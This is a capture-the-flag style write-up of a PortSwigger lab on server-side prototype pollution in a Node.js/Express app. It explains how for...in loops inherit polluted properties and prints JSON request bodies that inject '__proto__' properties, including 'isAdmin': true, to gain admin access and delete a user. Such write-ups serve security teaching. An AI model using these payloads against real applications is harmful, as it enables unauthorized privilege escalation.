# Privilege escalation via server-side prototype pollution

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/prototype-pollution/server-side/lab-privilege-escalation-via-server-side-prototype-pollution), you'll learn: Privilege escalation via server-side prototype pollution! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

This lab is built on Node.js and the Express framework. It is vulnerable to server-side [prototype pollution](https://portswigger.net/web-security/prototype-pollution) because it unsafely merges user-controllable input into a server-side JavaScript object. This is simple to detect because any polluted properties inherited via the prototype chain are visible in an HTTP response.

To solve the lab:

1. Find a prototype pollution source that you can use to add arbitrary properties to the global `Object.prototype`.
2. Identify a gadget property that you can use to escalate your privileges.
3.  the admin panel and delete the user `carlos`.

You can log in to your own account with the following credentials: `wiener:peter`

> Note:
>  
> When testing for server-side prototype pollution, it's possible to break application functionality or even bring down the server completely. If this happens to your lab, you can manually restart the server using the button provided in the lab banner. Remember that you're unlikely to have this option when testing real websites, so you should always use caution.

## Exploitation

### 1. Find a prototype pollution source that you can use to add arbitrary properties to the global `Object.prototype`

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Prototype-Pollution/Prototype-6/images/Pasted%20image%2020230222142632.png)

**Login as user `wiener`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Prototype-Pollution/Prototype-6/images/Pasted%20image%2020230222142703.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Prototype-Pollution/Prototype-6/images/Pasted%20image%2020230222142718.png)

In the "My account" page, we can update our billing and delivery address.

**Let's click on the "Submit" button and capture the request in Burp Suite HTTP history:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Prototype-Pollution/Prototype-6/images/Pasted%20image%2020230222142844.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Prototype-Pollution/Prototype-6/images/Pasted%20image%2020230222142849.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Prototype-Pollution/Prototype-6/images/Pasted%20image%2020230222142904.png)

When we clicked the "Submit" button, it'll send a POST request to `/my-account/change-address`, with parameter `address_line_1`, `address_line_2`, `city`, `postcode`, `country`, `sessionId` in JSON format.

**If the action has no error, it'll response a JSON data:**
```json
{
    "username":"wiener",
    "firstname":"Peter",
    "lastname":"Wiener",
    "address_line_1":"Wiener HQ",
    "address_line_2":"One Wiener Way",
    "city":"Wienerville",
    "postcode":"BU1 1RP",
    "country":"UK",
    "isAdmin":false
}
```

What's interesting for us is the `isAdmin` key.

***Now, what if the `isAdmin`'s value is set to `true`?***

In server-side prototype pollution, we can detect the polluted property via reflection (response).

An easy trap for developers to fall into is forgetting or overlooking the fact that a JavaScript `for...in` loop iterates over all of an object's enumerable properties, including ones that it has inherited via the prototype chain.

You can test this out for yourself as follows:

```js
const myObject = { a: 1, b: 2 }; 

// pollute the prototype with an arbitrary property
Object.prototype.foo = 'bar';

// confirm myObject doesn't have its own foo property
myObject.hasOwnProperty('foo'); // false

// list names of properties of myObject
for(const propertyKey in myObject){
    console.log(propertyKey);
}

// Output: a, b, foo
```

This also applies to arrays, where a `for...in` loop first iterates over each index, which is essentially just a numeric property key under the hood, before moving on to any inherited properties as well.

```js
const myArray = ['a','b'];
Object.prototype.foo = 'bar';

for(const arrayKey in myArray){
    console.log(arrayKey);
} 

// Output: 0, 1, foo
```

In either case, if the application later includes the returned properties in a response, this can provide a simple way to probe for server-side prototype pollution.

`POST` or `PUT` requests that submit JSON data to an application or API are prime candidates for this kind of behavior as it's common for servers to respond with a JSON representation of the new or updated object. In this case, you could attempt to pollute the global `Object.prototype` with an arbitrary property.

**Armed with above information, we can try to pollute the global `Object.prototype` in `/my-account/change-address`:**
```json
{
    "address_line_1":"Wiener HQ",
    "address_line_2":"One Wiener Way",
    "city":"Wienerville",
    "postcode":"BU1 1RP",
    "country":"UK",
    "sessionId":"FrxyDjNVyE7jx17mQ7LQBmPAkFXFcXEC",
    "__proto__": {
        "foo": "bar"
    }
}
```

**If the website is vulnerable, our injected property would then appear in the updated object in the response:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Prototype-Pollution/Prototype-6/images/Pasted%20image%2020230222144142.png)

### 2. Identify a gadget property that you can use to escalate your privileges

Now, if we change the `isAdmin` key's value to `true`, will us be able to access to the admin panel??

### 3. Access the admin panel and delete the user `carlos`

***To do so, we can our inject `isAdmin` property in `/my-account/change-address`:***
```json
{
    "address_line_1":"Wiener HQ",
    "address_line_2":"One Wiener Way",
    "city":"Wienerville",
    "postcode":"BU1 1RP",
    "country":"UK",
    "sessionId":"FrxyDjNVyE7jx17mQ7LQBmPAkFXFcXEC",
    "__proto__": {
        "isAdmin": true
    }
}
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Prototype-Pollution/Prototype-6/images/Pasted%20image%2020230222144419.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Prototype-Pollution/Prototype-6/images/Pasted%20image%2020230222144442.png)

Nice! We now can access to the admin panel!

**Let's delete user `carlos`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Prototype-Pollution/Prototype-6/images/Pasted%20image%2020230222144509.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Prototype-Pollution/Prototype-6/images/Pasted%20image%2020230222144524.png)

# What we've learned:

1. Privilege escalation via server-side prototype pollution